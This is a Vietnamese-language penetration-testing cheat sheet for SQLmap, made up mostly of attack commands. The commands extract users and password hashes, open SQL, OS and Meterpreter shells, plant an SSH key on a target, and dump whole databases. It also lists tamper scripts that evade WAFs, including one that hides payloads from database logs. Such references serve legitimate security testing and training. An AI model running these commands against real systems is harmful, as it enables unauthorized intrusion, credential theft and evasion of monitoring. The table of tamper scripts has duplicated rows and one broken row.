# SQLmap

> **SQLmap** là một công cụ mạnh giúp tự động hóa việc phát hiện và khai thác các lỗ hổng SQL Injection, giúp tiết kiệm đáng kể thời gian và công sức so với việc kiểm thử thủ công. Công cụ hỗ trợ nhiều loại cơ sở dữ liệu và nhiều kỹ thuật injection, khiến nó trở nên linh hoạt và hiệu quả trong nhiều tình huống.
>
> Ngoài ra, SQLmap có thể trích xuất dữ liệu, thao tác với database và thậm chí thực thi command, cung cấp một bộ tính năng mạnh cho pentester và security analyst.
>
> Việc “phát minh lại bánh xe” không phải lúc nào cũng hợp lý vì SQLmap đã được phát triển, kiểm thử và cải tiến nghiêm ngặt bởi các chuyên gia. Sử dụng một công cụ đáng tin cậy và được cộng đồng hỗ trợ giúp tận dụng các best practice đã được thiết lập, đồng thời giảm đáng kể nguy cơ bỏ sót vulnerability hoặc đưa lỗi vào code tự xây dựng.
>
> Tuy nhiên, bạn vẫn phải hiểu SQLmap hoạt động như thế nào và có khả năng tái hiện quá trình kiểm thử thủ công khi cần thiết.

## Summary

* [Basic Arguments For SQLmap](#basic-arguments-for-sqlmap)
* [Load A Request File](#load-a-request-file)
* [Custom Injection Point](#custom-injection-point)
* [Second Order Injection](#second-order-injection)
* [Getting A Shell](#getting-a-shell)
* [Crawl And Auto-Exploit](#crawl-and-auto-exploit)
* [Proxy Configuration For SQLmap](#proxy-configuration-for-sqlmap)
* [Injection Tampering](#injection-tampering)

  * [Suffix And Prefix](#suffix-and-prefix)
  * [Default Tamper Scripts](#default-tamper-scripts)
  * [Custom Tamper Scripts](#custom-tamper-scripts)
  * [Custom SQL Payload](#custom-sql-payload)
  * [Evaluate Python Code](#evaluate-python-code)
  * [Preprocess And Postprocess Scripts](#preprocess-and-postprocess-scripts)
* [Reduce Requests Number](#reduce-requests-number)
* [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
* [References](#references)

## Basic Arguments For SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## Load A Request File

Request file trong SQLmap là một HTTP request đã được lưu lại mà SQLmap đọc và sử dụng để thực hiện kiểm thử SQL Injection. File này cho phép cung cấp một HTTP request hoàn chỉnh và tùy chỉnh, phù hợp với các ứng dụng phức tạp hơn.

```powershell
sqlmap -r request.txt
```

## Custom Injection Point

Custom injection point trong SQLmap cho phép chỉ định chính xác vị trí và cách SQLmap thực hiện injection vào request. Điều này hữu ích khi xử lý những trường hợp injection phức tạp hoặc không theo chuẩn mà SQLmap không tự động phát hiện được.

Bằng cách xác định injection point với ký tự wildcard `` `*` ``, bạn có thể kiểm soát chính xác hơn quá trình kiểm thử, đảm bảo SQLmap tập trung vào phần request mà bạn nghi ngờ dễ bị khai thác.

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

## Second Order Injection

Second-order SQL Injection xảy ra khi mã SQL độc hại được chèn vào ứng dụng nhưng không được thực thi ngay lập tức. Thay vào đó, dữ liệu được lưu vào database và sau đó được sử dụng trong một SQL query khác.

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## Getting A Shell

* SQL Shell:

  ```ps1
  sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
  ```

* OS Shell:

  ```ps1
  sqlmap -u "http://example.com/?id=1"  -p id --os-shell
  ```

* Meterpreter:

  ```ps1
  sqlmap -u "http://example.com/?id=1"  -p id --os-pwn
  ```

* SSH Shell:

  ```ps1
  sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
  ```

## Crawl And Auto-Exploit

Phương pháp này không được khuyến nghị khi thực hiện penetration testing trên hệ thống thực tế; chỉ nên sử dụng trong môi trường được kiểm soát hoặc các challenge. Nó sẽ crawl toàn bộ website và tự động submit các form, điều này có thể dẫn đến việc gửi request ngoài ý muốn tới những chức năng nhạy cảm như endpoint `delete` hoặc `destroy`.

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = Chế độ không tương tác; SQLmap thường sẽ đặt câu hỏi và tùy chọn này chấp nhận các câu trả lời mặc định.
* `--crawl` = Độ sâu mà bạn muốn crawl website.
* `--forms` = Parse và kiểm thử các form.

## Proxy Configuration For SQLmap

Để chạy SQLmap thông qua proxy, có thể sử dụng tùy chọn `--proxy` kèm theo URL của proxy. SQLmap hỗ trợ nhiều loại proxy như HTTP, HTTPS, SOCKS4 và SOCKS5.

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP Proxy:

  ```ps1
  --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="http://user:pass@127.0.0.1:8080"
  ```

* SOCKS Proxy:

  ```ps1
  --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="socks4://user:pass@127.0.0.1:1080"
  ```

* SOCKS5 Proxy:

  ```ps1
  --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
  --proxy="socks5://user:pass@127.0.0.1:1080"
  ```

## Injection Tampering

Trong SQLmap, tampering có thể giúp điều chỉnh injection theo yêu cầu cụ thể để vượt qua WAF hoặc các cơ chế sanitization tùy chỉnh. SQLmap cung cấp nhiều tùy chọn và kỹ thuật để thay đổi payload được sử dụng cho SQL Injection.

### Suffix And Prefix

Các tùy chọn `--suffix` và `--prefix` cho phép chỉ định những chuỗi bổ sung được thêm vào cuối hoặc đầu các payload do SQLmap tạo ra. Những tùy chọn này hữu ích khi ứng dụng mục tiêu yêu cầu một format cụ thể hoặc khi cần vượt qua một số filter hoặc protection mechanism.

```powershell
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: Thêm chuỗi được chỉ định vào cuối mỗi payload do SQLmap tạo ra.
* `--prefix=PREFIX`: Thêm chuỗi được chỉ định vào đầu mỗi payload do SQLmap tạo ra.

### Default Tamper Scripts

Tamper script là một script có nhiệm vụ sửa đổi SQL Injection payload nhằm né tránh việc phát hiện bởi WAF hoặc các security mechanism khác. SQLmap đi kèm nhiều tamper script được xây dựng sẵn để tự động điều chỉnh payload.

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

Dưới đây là một số tamper script thường được sử dụng:

| Tamper                         | Mô tả                                                                                                                |   |    |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------- | - | -- |
| `0x2char.py`                   | Thay thế mỗi chuỗi được mã hóa dạng MySQL `0xHEX` bằng dạng tương đương sử dụng `CONCAT(CHAR(),…)`                   |   |    |
| `apostrophemask.py`            | Thay thế ký tự apostrophe bằng ký tự full-width UTF-8 tương ứng                                                      |   |    |
| `apostrophenullencode.py`      | Thay thế apostrophe bằng dạng Unicode double-byte không hợp lệ                                                       |   |    |
| `appendnullbyte.py`            | Thêm ký tự NULL byte đã được encode vào cuối payload                                                                 |   |    |
| `base64encode.py`              | Base64 hóa toàn bộ ký tự trong payload                                                                               |   |    |
| `between.py`                   | Thay toán tử lớn hơn (`>`) bằng `NOT BETWEEN 0 AND #`                                                                |   |    |
| `bluecoat.py`                  | Thay khoảng trắng sau SQL statement bằng một blank character hợp lệ ngẫu nhiên, sau đó thay toán tử `=` bằng `LIKE`  |   |    |
| `chardoubleencode.py`          | Double URL-encode toàn bộ ký tự trong payload chưa được encode                                                       |   |    |
| `charencode.py`                | URL-encode toàn bộ ký tự trong payload chưa được encode, ví dụ `SELECT` → `%53%45%4C%45%43%54`                       |   |    |
| `charunicodeencode.py`         | Unicode-URL-encode các ký tự chưa được encode, ví dụ `SELECT` → `%u0053%u0045%u004C%45%43%54`                        |   |    |
| `charunicodeescape.py`         | Unicode-escape các ký tự chưa được encode, ví dụ `SELECT` → `\u0053\u0045\u004C\u0045\u0043\u0054`                   |   |    |
| `commalesslimit.py`            | Thay `LIMIT M, N` bằng `LIMIT N OFFSET M`                                                                            |   |    |
| `commalessmid.py`              | Thay `MID(A, B, C)` bằng `MID(A FROM B FOR C)`                                                                       |   |    |
| `commentbeforeparentheses.py`  | Thêm inline comment trước dấu ngoặc, ví dụ `( -> /**/()`                                                             |   |    |
| `concat2concatws.py`           | Thay `CONCAT(A, B)` bằng dạng tương đương `CONCAT_WS(...)`                                                           |   |    |
| `charencode.py`                | URL-encode toàn bộ ký tự trong payload chưa được encode                                                              |   |    |
| `charunicodeencode.py`         | Unicode-URL-encode các ký tự chưa được encode                                                                        |   |    |
| `equaltolike.py`               | Thay toàn bộ toán tử bằng (`=`) bằng toán tử `LIKE`                                                                  |   |    |
| `escapequotes.py`              | Escape slash cho các dấu quote (`'` và `"`)                                                                          |   |    |
| `greatest.py`                  | Thay toán tử lớn hơn (`>`) bằng dạng tương đương sử dụng `GREATEST`                                                  |   |    |
| `halfversionedmorekeywords.py` | Thêm MySQL versioned comment trước mỗi keyword                                                                       |   |    |
| `htmlencode.py`                | HTML-encode tất cả ký tự không phải alphanumeric bằng code point, ví dụ `'` → `&#39;`                                |   |    |
| `ifnull2casewhenisnull.py`     | Thay `IFNULL(A, B)` bằng `CASE WHEN ISNULL(A) THEN (B) ELSE (A) END`                                                 |   |    |
| `ifnull2ifisnull.py`           | Thay `IFNULL(A, B)` bằng `IF(ISNULL(A), B, A)`                                                                       |   |    |
| `informationschemacomment.py`  | Thêm inline comment (`/**/`) vào cuối các occurrence của MySQL `information_schema`                                  |   |    |
| `least.py`                     | Thay toán tử lớn hơn (`>`) bằng dạng tương đương sử dụng `LEAST`                                                     |   |    |
| `lowercase.py`                 | Chuyển các keyword thành chữ thường, ví dụ `SELECT` → `select`                                                       |   |    |
| `modsecurityversioned.py`      | Đặt toàn bộ query bên trong versioned comment                                                                        |   |    |
| `modsecurityzeroversioned.py`  | Đặt toàn bộ query bên trong zero-versioned comment                                                                   |   |    |
| `multiplespaces.py`            | Thêm nhiều khoảng trắng xung quanh SQL keyword                                                                       |   |    |
| `nonrecursivereplacement.py`   | Thay thế các SQL keyword được định nghĩa trước bằng dạng phù hợp để vượt qua filter sử dụng `.replace("SELECT", "")` |   |    |
| `overlongutf8.py`              | Chuyển đổi các ký tự trong payload sang dạng UTF-8 overlong                                                          |   |    |
| `overlongutf8more.py`          | Chuyển toàn bộ ký tự sang overlong UTF-8                                                                             |   |    |
| `percentage.py`                | Thêm ký tự `%` trước mỗi ký tự                                                                                       |   |    |
| `plus2concat.py`               | Thay toán tử `+` bằng dạng tương đương sử dụng hàm `CONCAT()` của MsSQL                                              |   |    |
| `plus2fnconcat.py`             | Thay toán tử `+` bằng hàm ODBC `{fn CONCAT()}` của MsSQL                                                             |   |    |
| `randomcase.py`                | Chuyển từng ký tự keyword sang chữ hoa/chữ thường ngẫu nhiên                                                         |   |    |
| `randomcomments.py`            | Thêm comment ngẫu nhiên vào SQL keyword                                                                              |   |    |
| `securesphere.py`              | Thêm một chuỗi được tạo đặc biệt                                                                                     |   |    |
| `sp_password.py`               | Thêm `sp_password` vào cuối payload nhằm tự động obfuscate payload khỏi DBMS log                                     |   |    |
| `space2comment.py`             | Thay khoảng trắng (` `) bằng comment                                                                                 |   |    |
| `space2dash.py`                | Thay khoảng trắng bằng dash comment (`--`) kèm chuỗi ngẫu nhiên và newline (`\n`)                                    |   |    |
| `space2hash.py`                | Thay khoảng trắng bằng ký tự hash (`#`) kèm chuỗi ngẫu nhiên và newline (`\n`)                                       |   |    |
| `space2morehash.py`            | Thay khoảng trắng bằng ký tự hash (`#`) kèm chuỗi ngẫu nhiên và newline (`\n`)                                       |   |    |
| `space2mssqlblank.py`          | Thay khoảng trắng bằng một blank character ngẫu nhiên hợp lệ                                                         |   |    |
| `space2mssqlhash.py`           | Thay khoảng trắng bằng hash (`#`) kèm newline                                                                        |   |    |
| `space2mysqlblank.py`          | Thay khoảng trắng bằng blank character ngẫu nhiên                                                                    |   |    |
| `space2mysqldash.py`           | Thay khoảng trắng bằng dash comment (`--`) kèm newline                                                               |   |    |
| `space2plus.py`                | Thay khoảng trắng bằng dấu cộng (`+`)                                                                                |   |    |
| `space2randomblank.py`         | Thay khoảng trắng bằng một blank character ngẫu nhiên                                                                |   |    |
| `symboliclogical.py`           | Thay toán tử logic `AND` và `OR` bằng các dạng ký hiệu tương ứng (`&&` và `                                          |   | `) |
| `unionalltounion.py`           | Thay `UNION ALL SELECT` bằng `UNION SELECT`                                                                          |   |    |
| `unmagicquotes.py`             | Thay quote (`'`) bằng `%bf%27` cùng generic comment ở cuối                                                           |   |    |
| `uppercase.py`                 | Chuyển keyword thành chữ hoa, ví dụ `INSERT`                                                                         |   |    |
| `varnish.py`                   | Thêm HTTP header `X-originating-IP`                                                                                  |   |    |
| `versionedkeywords.py`         | Đặt mỗi non-function keyword bên trong MySQL versioned comment                                                       |   |    |
| `versionedmorekeywords.py`     | Đặt mỗi keyword bên trong MySQL versioned comment                                                                    |   |    |
| `xforwardedfor.py`             | Thêm HTTP header giả `X-Forwarded-For`                                                                               |   |    |

### Custom Tamper Scripts

Khi tạo custom tamper script, cần chú ý một số biến và function bắt buộc. Kiến trúc script bao gồm:

* `__priority__`: Xác định thứ tự áp dụng tamper script. Điều này quyết định script được thực thi sớm hay muộn trong tamper pipeline. Priority thông thường là `0`, cao nhất là `100`.
* `dependencies()`: Function được gọi trước khi tamper script được sử dụng.
* `tamper(payload)`: Function chính dùng để sửa đổi payload.

Đoạn code dưới đây minh họa một tamper script thay thế dạng `LIMIT M, N` bằng dạng `LIMIT N OFFSET M`:

```py
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

* Lưu script với tên chẳng hạn `mytamper.py`.

* Đặt nó trong thư mục `tamper/` của SQLmap, thường là:

  ```ps1
  /usr/share/sqlmap/tamper/
  ```

* Sử dụng với SQLmap:

  ```ps1
  sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
  ```

### Custom SQL Payload

Tùy chọn `--sql-query` trong SQLmap được sử dụng để thực thi thủ công SQL query của riêng bạn trên database dễ bị tổn thương sau khi SQLmap đã xác nhận injection và thu thập đủ quyền truy cập.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### Evaluate Python Code

Tùy chọn `--eval` cho phép định nghĩa hoặc sửa đổi request parameter bằng Python. Các biến được evaluate sau đó có thể được sử dụng bên trong URL, header, cookie, v.v.

Đặc biệt hữu ích trong các trường hợp:

* **Dynamic parameters**: Khi parameter cần được tạo ngẫu nhiên hoặc tuần tự.
* **Token generation**: Khi cần xử lý CSRF token hoặc dynamic authentication header.
* **Custom logic**: Ví dụ encoding, encryption, timestamp, v.v.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

### Preprocess And Postprocess Scripts

```ps1
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

#### Preprocessing Script (preprocess.py)

Preprocessing script được sử dụng để sửa đổi request data trước khi gửi tới target application. Điều này hữu ích cho việc encoding parameter, thêm header hoặc thực hiện các request modification khác.

```ps1
--preprocess=preprocess.py    Use given script(s) for preprocessing (request)
```

**Ví dụ `preprocess.py`:**

```py
#!/usr/bin/env python
def preprocess(req):
    print("Preprocess")
    print(req)
```

#### Postprocessing Script (postprocess.py)

Postprocessing script được sử dụng để sửa đổi response data sau khi nhận được từ target application. Điều này hữu ích cho việc decode response, trích xuất dữ liệu hoặc thực hiện các response modification khác.

```ps1
--postprocess=postprocess.py  Use given script(s) for postprocessing (response)
```

## Reduce Requests Number

Parameter `--test-filter` hữu ích khi muốn tập trung vào một số loại SQL Injection technique hoặc payload cụ thể. Thay vì kiểm thử toàn bộ payload mà SQLmap cung cấp, có thể giới hạn các test phù hợp với một pattern nhất định, giúp quá trình kiểm thử hiệu quả hơn, đặc biệt với web application lớn hoặc phản hồi chậm.

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

Mặc định, SQLmap chạy với `level 1` và `risk 1`, tạo ra ít request hơn. Không nên tăng các giá trị này nếu không có mục đích rõ ràng vì số lượng test có thể tăng đáng kể, dẫn tới quá trình kiểm thử mất nhiều thời gian và tạo ra các request không cần thiết.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

Sử dụng tùy chọn `--technique` để chỉ định loại SQL Injection technique cần kiểm thử thay vì kiểm thử tất cả các kỹ thuật có thể.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```

## SQLmap Without SQL Injection

Sử dụng SQLmap mà không trực tiếp khai thác SQL Injection vẫn có thể hữu ích cho nhiều mục đích hợp pháp, đặc biệt trong security assessment, database management và application testing.

Có thể sử dụng SQLmap để truy cập database thông qua port thay vì URL:

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```

## References

* [#SQLmap protip - @zh4ck - March 10, 2018](https://web.archive.org/web/20240827145141/https://twitter.com/zh4ck/status/972441560875970560)
* [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://web.archive.org/web/20170802071522/https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
